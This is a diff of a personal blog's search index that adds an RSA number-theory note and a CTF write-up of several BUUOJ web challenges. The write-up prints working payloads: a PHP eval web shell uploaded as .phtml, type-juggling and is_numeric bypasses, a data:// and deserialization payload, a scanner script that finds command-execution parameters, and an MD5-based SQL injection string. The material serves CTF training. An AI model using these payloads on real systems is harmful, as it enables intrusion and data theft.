@@ -129,88 +129,6 @@
       </tags>
   </entry>
   <entry>
-    <title>RSA算法原理</title>
-    <url>/2020/09/13/RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</url>
-    <content><![CDATA[<hr>
-<a id="more"></a>
-
-<h1 id="数论的一些知识"><a href="#数论的一些知识" class="headerlink" title="数论的一些知识"></a>数论的一些知识</h1><h2 id="欧拉函数-φ-x"><a href="#欧拉函数-φ-x" class="headerlink" title="欧拉函数 φ(x)"></a>欧拉函数 φ(x)</h2><p>​    将不大于正整数 m 且与之互素的正整数个数称之为欧拉函数，记为 φ(m) </p>
-<h2 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h2><p>​    设正整数 m 与整数 a 互素，则 </p>
-<blockquote>
-<p>​            a<sup>φ(m)</sup> ≡ 1 (mod m)</p>
-</blockquote>
-<h2 id="欧拉函数的积性"><a href="#欧拉函数的积性" class="headerlink" title="欧拉函数的积性"></a>欧拉函数的积性</h2><p>​    <strong>定义</strong>：设正整数 m 与 n 互素，若 f(mn) = f(m) f(n)，则称数论函数 f 为积性函数</p>
-<p>​    <strong>-&gt;定理</strong>：设正整数 n 有素分解式 n = p<sub>1</sub><sup>a<sub>1</sub></sup> p<sub>2</sub><sup>a<sub>2</sub></sup> … p<sub>s</sub><sup>a<sub>s</sub></sup>，则积性函数 f 的函数值 </p>
-<blockquote>
-<p>​            f(n) = f(p<sub>1</sub><sup>a<sub>1</sub></sup>) f(p<sub>2</sub><sup>a<sub>2</sub></sup>) … f(p<sub>s</sub><sup>a<sub>s</sub></sup>)</p>
-</blockquote>
-<h2 id="φ-x-的计算"><a href="#φ-x-的计算" class="headerlink" title="φ(x) 的计算"></a>φ(x) 的计算</h2><p>​    <strong>定理1</strong> 若 p 为素数，则 φ(p) = p - 1；反之，若自然数p满足等式 φ(p) = p - 1，则 p 是素数</p>
-<p>​    <strong>定理2</strong> 若 p 为素数，a 为正整数，则</p>
-<blockquote>
-<p>​            φ(p<sup>a</sup>) = p<sup>a</sup> - p<sup>a-1</sup></p>
-</blockquote>
-<p>​    <strong>定理3</strong> 设正整数 n 有素分解式 n = p<sub>1</sub><sup>a<sub>1</sub></sup> p<sub>2</sub><sup>a<sub>2</sub></sup> … p<sub>s</sub><sup>a<sub>s</sub></sup>，则</p>
-<blockquote>
-<p>​            φ(x) = n (1-${1\over p_{1}}$) (1-${1\over p_{2}}$) … (1-${1\over p_{s}}$)</p>
-</blockquote>
-<p>​    <strong>定理4</strong> 设 n 是大于2的正整数，则欧拉函数 φ(x) 是偶数</p>
-<h2 id="模反元素"><a href="#模反元素" class="headerlink" title="模反元素"></a>模反元素</h2><p>若两个正整数 a 和 n 互素，那么必有整数 b，使得 ab ≡ 1 (mod n)。此时，称 b 为 a 的”模反元素“</p>
-<p>​    证明：由欧拉定理知</p>
-<blockquote>
-<p>​            a<sup>φ(n)</sup> ≡ 1 (mod n)</p>
-</blockquote>
-<p>​    那么至少有 b = a<sup>φ(n)-1</sup>，满足</p>
-<blockquote>
-<p>​            ab = a * a<sup>φ(n)-1</sup> = a<sup>φ(n)</sup> ≡ 1 (mod n)</p>
-</blockquote>
-<p>​    所以正整数 a 和 n 互素的前提下，a 的模反元素 b 一定存在</p>
-<p>模反元素没有唯一性</p>
-<p>​    证明：已知 b = a<sup>φ(n)-1</sup> 是 a 的模反元素</p>
-<blockquote>
-<p>​    ab ≡ 1 (mod n) &lt;=&gt; ab = kn + 1 ( k ∈ Z )</p>
-</blockquote>
-<p>​    令 t = k - a</p>
-<blockquote>
-<p>​    ab = ( t + a )n + 1</p>
-</blockquote>
-<blockquote>
-<p>​    a( b - n) = tn + 1</p>
-</blockquote>
-<blockquote>
-<p>​    即 a( b - n) ≡ 1 (mod n)</p>
-</blockquote>
-<p>​    那么  (b - n) 也是 a 的模反元素，而且同样构造于 mod n 上</p>
-<p><em>以上所有内容看不懂请从头学习《初等数论》</em></p>
-<h1 id="密钥的生成"><a href="#密钥的生成" class="headerlink" title="密钥的生成"></a>密钥的生成</h1><p><strong>Step 1</strong>：随机选两个不相等的质数  p 和 q</p>
-<p>​    一般这两个质数越大安全性越高</p>
-<p><strong>Step 2</strong>：计算 p * q = n</p>
-<p>​    n 转换为二进制的位数即为密钥长度</p>
-<p><strong>Step 3</strong>：计算欧拉函数 φ(n)</p>
-<p>​    算法如上所示</p>
-<p><strong>Step 4</strong>：随机选择一个整数 e（1&lt; e &lt; φ(n)，e 与 φ(n) 互素）</p>
-<p>​    常用建议的是 65537</p>
-<p><strong>Step 5</strong>：计算 e 对于 φ(n) 的模反元素 d</p>
-<p>​    e 与 φ(n) 互素，由模反元素定义知，存在 d 满足</p>
-<blockquote>
-<p>​            ed ≡ 1 (mod φ(n))</p>
-</blockquote>
-<p>​    可以利用扩展欧几里得算法求解</p>
-<p><strong>Step 6</strong>：公钥和私钥</p>
-<p>​    公钥： n 和 e</p>
-<p>​    私钥： n 和 d</p>
-<h1 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h1><p>加密：</p>
-<p>​    使用到公钥 ( n , e )</p>
-<p>解密：</p>
-<p>​    使用到私钥 ( n , d )</p>
-<h1 id="RSA算法的安全性"><a href="#RSA算法的安全性" class="headerlink" title="RSA算法的安全性"></a>RSA算法的安全性</h1><h1 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h1>]]></content>
-      <categories>
-        <category>note</category>
-      </categories>
-      <tags>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入</title>
     <url>/2020/07/29/SQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><a id="more"></a>
@@ -260,6 +178,167 @@
       </categories>
       <tags>
         <tag>CTF - Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RSA算法原理</title>
+    <url>/2020/09/13/RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+
+<h1 id="数论的一些知识"><a href="#数论的一些知识" class="headerlink" title="数论的一些知识"></a>数论的一些知识</h1><h2 id="欧拉函数-φ-x"><a href="#欧拉函数-φ-x" class="headerlink" title="欧拉函数 φ(x)"></a>欧拉函数 φ(x)</h2><p>​    将不大于正整数 m 且与之互素的正整数个数称之为欧拉函数，记为 φ(m) </p>
+<h2 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h2><p>​    设正整数 m 与整数 a 互素，则 </p>
+<blockquote>
+<p>​            a<sup>φ(m)</sup> ≡ 1 (mod m)</p>
+</blockquote>
+<h2 id="欧拉函数的积性"><a href="#欧拉函数的积性" class="headerlink" title="欧拉函数的积性"></a>欧拉函数的积性</h2><p>​    <strong>定义</strong>：设正整数 m 与 n 互素，若 f(mn) = f(m) f(n)，则称数论函数 f 为积性函数</p>
+<p>​    <strong>-&gt;定理</strong>：设正整数 n 有素分解式 n = p<sub>1</sub><sup>a<sub>1</sub></sup> p<sub>2</sub><sup>a<sub>2</sub></sup> … p<sub>s</sub><sup>a<sub>s</sub></sup>，则积性函数 f 的函数值 </p>
+<blockquote>
+<p>​            f(n) = f(p<sub>1</sub><sup>a<sub>1</sub></sup>) f(p<sub>2</sub><sup>a<sub>2</sub></sup>) … f(p<sub>s</sub><sup>a<sub>s</sub></sup>)</p>
+</blockquote>
+<h2 id="φ-x-的计算"><a href="#φ-x-的计算" class="headerlink" title="φ(x) 的计算"></a>φ(x) 的计算</h2><p>​    <strong>定理1</strong> 若 p 为素数，则 φ(p) = p - 1；反之，若自然数p满足等式 φ(p) = p - 1，则 p 是素数</p>
+<p>​    <strong>定理2</strong> 若 p 为素数，a 为正整数，则</p>
+<blockquote>
+<p>​            φ(p<sup>a</sup>) = p<sup>a</sup> - p<sup>a-1</sup></p>
+</blockquote>
+<p>​    <strong>定理3</strong> 设正整数 n 有素分解式 n = p<sub>1</sub><sup>a<sub>1</sub></sup> p<sub>2</sub><sup>a<sub>2</sub></sup> … p<sub>s</sub><sup>a<sub>s</sub></sup>，则</p>
+<blockquote>
+<p>​            φ(x) = n (1-${1\over p_{1}}$) (1-${1\over p_{2}}$) … (1-${1\over p_{s}}$)</p>
+</blockquote>
+<p>​    <strong>定理4</strong> 设 n 是大于2的正整数，则欧拉函数 φ(x) 是偶数</p>
+<h2 id="模反元素"><a href="#模反元素" class="headerlink" title="模反元素"></a>模反元素</h2><p>若两个正整数 a 和 n 互素，那么必有整数 b，使得 ab ≡ 1 (mod n)。此时，称 b 为 a 的”模反元素“</p>
+<p>​    证明：由欧拉定理知</p>
+<blockquote>
+<p>​            a<sup>φ(n)</sup> ≡ 1 (mod n)</p>
+</blockquote>
+<p>​    那么至少有 b = a<sup>φ(n)-1</sup>，满足</p>
+<blockquote>
+<p>​            ab = a * a<sup>φ(n)-1</sup> = a<sup>φ(n)</sup> ≡ 1 (mod n)</p>
+</blockquote>
+<p>​    所以正整数 a 和 n 互素的前提下，a 的模反元素 b 一定存在</p>
+<p>模反元素没有唯一性</p>
+<p>​    证明：已知 b = a<sup>φ(n)-1</sup> 是 a 的模反元素</p>
+<blockquote>
+<p>​            ab ≡ 1 (mod n) &lt;=&gt; ab = kn + 1 ( k ∈ Z )</p>
+</blockquote>
+<p>​    令 t = k - a</p>
+<blockquote>
+<p>​            ab = ( t + a )n + 1</p>
+</blockquote>
+<blockquote>
+<p>​            a( b - n) = tn + 1</p>
+</blockquote>
+<blockquote>
+<p>​            即 a( b - n) ≡ 1 (mod n)</p>
+</blockquote>
+<p>​    那么  (b - n) 也是 a 的模反元素，而且同样构造于 mod n 上</p>
+<h2 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h2><p>若素数 p 不整除正整数 a ，则</p>
+<blockquote>
+<p>​            a<sup>p-1</sup> ≡ 1 ( mod p )</p>
+</blockquote>
+<p><em>以上所有内容看不懂请从头学习《初等数论》</em></p>
+<h1 id="密钥的生成"><a href="#密钥的生成" class="headerlink" title="密钥的生成"></a>密钥的生成</h1><p><strong>Step 1</strong>：随机选两个不相等的质数  p 和 q</p>
+<p>​    一般这两个质数越大安全性越高</p>
+<p><strong>Step 2</strong>：计算 p * q = n</p>
+<p>​    n 转换为二进制的位数即为密钥长度</p>
+<p><strong>Step 3</strong>：计算欧拉函数 φ(n)</p>
+<p>​    算法如上所示</p>
+<p><strong>Step 4</strong>：随机选择一个整数 e（1&lt; e &lt; φ(n)，e 与 φ(n) 互素）</p>
+<p>​    常用建议的是 65537</p>
+<p><strong>Step 5</strong>：计算 e 对于 φ(n) 的模反元素 d</p>
+<p>​    e 与 φ(n) 互素，由模反元素定义知，存在 d 满足</p>
+<blockquote>
+<p>​            ed ≡ 1 (mod φ(n))</p>
+</blockquote>
+<p>​    可以利用扩展欧几里得算法求解</p>
+<p><strong>Step 6</strong>：公钥和私钥</p>
+<p>​    公钥： n 和 e</p>
+<p>​    私钥： n 和 d</p>
+<h1 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h1><p>约定明文为 M，密文为 S</p>
+<p>加密：</p>
+<p>​    使用到公钥 ( n , e )</p>
+<blockquote>
+<p>​            C ≡ M<sup>e</sup> ( mod n )</p>
+</blockquote>
+<p>解密：</p>
+<p>​    使用到私钥 ( n , d )</p>
+<blockquote>
+<p>​            M ≡ C<sup>d</sup> ( mod n )</p>
+</blockquote>
+<p>证明：由加密方程知</p>
+<blockquote>
+<p>​            M<sup>e</sup> + remainder = C + kn + remainder</p>
+<p>​            C = M<sup>e</sup> - kn</p>
+</blockquote>
+<p>​    代入解密方程右半：</p>
+<blockquote>
+<p>​            ( M<sup>e</sup> - kn )<sup>d</sup>  mod n = M<sup>ed</sup> mod n</p>
+</blockquote>
+<p>​    由于 ed ≡ 1 (mod φ(n))，故</p>
+<blockquote>
+<p>​            ed = hφ(n) + 1</p>
+</blockquote>
+<p>​    代入上式：</p>
+<blockquote>
+<p>​            C<sup>d</sup> ≡ M<sup>hφ(n)+1</sup> (mod n)</p>
+</blockquote>
+<p>​    (1) 若 M 与 n互素：</p>
+<p>​    由欧拉定理知</p>
+<blockquote>
+<p>​            M<sup>φ(n)</sup> ≡ 1 (mod n)</p>
+<p>​            M<sup>φ(n)</sup> = kn + 1</p>
+<p>​            ( M<sup>φ(n)</sup> )<sup>h</sup> = ( kn + 1 )<sup>h</sup> ≡ 1 ( mod n )</p>
+<p>​            M<sup>hφ(n)+1</sup> ≡ M ( mod n )</p>
+</blockquote>
+<p>​    (2) 若 M 与 n 不互素：</p>
+<p>​    由于 n 有唯一素分解式 n = p * q </p>
+<p>​    则 gcd( M , n ) = p 或 gcd( M , n ) = q</p>
+<p>​    不妨：gcd( M , n ) = q ； M = k * p</p>
+<p>​    由费马小定理：</p>
+<blockquote>
+<p>​            m<sup>q-1</sup> ≡ 1 ( mod q )</p>
+</blockquote>
+<p>​    使用欧拉定理同上：</p>
+<blockquote>
+<p>​            ( M<sup>φ(q)</sup> )<sup>h(p-1)</sup> = ( kq + 1 )<sup>h(p-1)</sup> ≡ 1 ( mod q )</p>
+<p>​    -&gt;    ( M<sup>q-1</sup> )<sup>h(p-1)</sup>  ≡ 1 ( mod q )</p>
+</blockquote>
+<p>​    已知 </p>
+<blockquote>
+<p>​            φ(n) = ( p - 1 )( q - 1 )</p>
+<p>​            ed = hφ(n) + 1</p>
+<p>​    -&gt;    M<sup>ed-1</sup> ≡ 1 ( mod q )</p>
+<p>​    -&gt;    M<sup>ed-1</sup> = sq + 1</p>
+<p>​    -&gt;    M<sup>ed</sup> = sqM + M</p>
+<p>​            M = k * p</p>
+<p>​    -&gt;    M<sup>ed</sup> = sqkp + M</p>
+<p>​    -&gt;    M<sup>ed</sup> = skn + M</p>
+<p>​    -&gt;    M<sup>ed </sup> ≡ M ( mod n )</p>
+</blockquote>
+<p>​    综上所述，解密方程 M ≡ C<sup>d</sup> ( mod n ) 成立</p>
+<h1 id="RSA算法的安全性"><a href="#RSA算法的安全性" class="headerlink" title="RSA算法的安全性"></a>RSA算法的安全性</h1><p>解密的关键在私钥中的模反元素 d </p>
+<blockquote>
+<p>​            ed ≡ 1 (mod φ(n))</p>
+</blockquote>
+<p>要求出 d 必定需要知道 φ(n)</p>
+<p>在公钥中可以获得 n ，但是不知道 p 和 q 的情况下，只能依靠</p>
+<ol>
+<li><p>计算 n 的素分解式 p ，q</p>
+</li>
+<li><p>迭代验证 0 ~ n 中与 n 互素的整数个数</p>
+</li>
+</ol>
+<p>事实是，在 n 的素分解式未知的情况下几乎不可能在可接受时间内获得d，<br>所以认为算法是安全的</p>
+<p>但是针对不恰当的参数设置，RSA有可能被破解，详细方法可以参考以下资料</p>
+<h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p><a href="https://www.0x002.com/2020/%E5%AF%B9RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E7%9A%84%E7%AE%80%E5%8D%95%E7%A0%94%E7%A9%B6#%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80" target="_blank" rel="noopener">https://www.0x002.com/2020/%E5%AF%B9RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E7%9A%84%E7%AE%80%E5%8D%95%E7%A0%94%E7%A9%B6#%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80</a></p>
+<p><a href="https://xz.aliyun.com/t/6459" target="_blank" rel="noopener">https://xz.aliyun.com/t/6459</a></p>
+<p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84632</a></p>
+]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -697,6 +776,100 @@
       </tags>
   </entry>
   <entry>
+    <title>week20200803-20200809</title>
+    <url>/2020/08/06/week20200803-20200809/</url>
+    <content><![CDATA[<h1 id="Week-4-lt-2020-08-03-2020-08-09-gt"><a href="#Week-4-lt-2020-08-03-2020-08-09-gt" class="headerlink" title="Week 4&lt;2020.08.03 - 2020.08.09&gt;"></a>Week 4&lt;2020.08.03 - 2020.08.09&gt;</h1><a id="more"></a>
+
+<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>网页给出提示<strong>Try to find out source file!</strong><br>访问备份文件：/index.php.bak<br>源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即：<br>以GET方式传参，key值等于”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”（字符串）<br>key值要求为数字</p>
+<p>考点：</p>
+<blockquote>
+<p>PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉</p>
+</blockquote>
+<p>payload: /?key=123</p>
+<p>flag{32bbbcc8-df1b-419c-b0f7-fc8fe3bd9e48}</p>
+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>查看源代码，/pay.php</p>
+<p>网页源代码注意到：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>burpsuite拦截：<br><img src="/2020/08/06/week20200803-20200809/image-20200806022344298.png" alt="image-20200806022344298"></p>
+<p>repeater：</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025631219.png" alt="image-20200806025631219"></p>
+<p>绕过<code>is_numeric()</code>的方法：</p>
+<blockquote>
+<p><strong>php中的is_numeric()漏洞</strong><br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
+</blockquote>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025600159.png" alt="image-20200806025600159"></p>
+<p>提示 <strong>Flag need your 100000000 money</strong></p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025538945.png" alt="image-20200806025538945"></p>
+<p>注：这里也可以用科学计数法绕过<br><img src="/2020/08/06/week20200803-20200809/image-20200806025510788.png" alt="image-20200806025510788"></p>
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>随便上传一个文件</p>
+<p>报错：</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810024847689.png" alt="image-20200810024847689"></p>
+<p>抓包，修改后缀为.phtml，内容是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'ye'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传成功</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810025324304.png" alt="image-20200810025324304"></p>
+<p>蚁剑连接，在根目录下找到flag</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810025309017.png" alt="image-20200810025309017"></p>
+<p>flag{9b3cc74d-daad-4ad2-a788-82c9d0c3ec16}</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>网页代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>payload:<br><a href="http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D" target="_blank" rel="noopener">http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</a></p>
+<p>flag{77a1ae97-c1ad-44d3-b1e0-99c77f190391}</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>利用脚本寻找利用点</p>
+<p>分析脚本（转载<a href="https://blog.csdn.net/a3320315/article/details/102945940）" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940）</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  		<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"D:/soft/phpstudy/PHPTutorial/WWW/src/"</span></span><br><span class="line">os.chdir(filePath)											<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>						<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>										<span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">'trying   '</span>+file+ <span class="string">'     '</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1/src/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)		<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()											<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:						<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()							<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()						<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:							<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:													<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+
+<p>payload<br><code>/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code></p>
+<p><strong>flag{9b7d075f-096d-42b2-8cf6-69d0fbf34c12}</strong></p>
+<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>考点：</p>
+<h3 id="password-’”-md5-pass-true-”‘"><a href="#password-’”-md5-pass-true-”‘" class="headerlink" title="password=’”.md5($pass,true).”‘"></a>password=’”.md5($pass,true).”‘</h3><blockquote>
+<p>ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p>
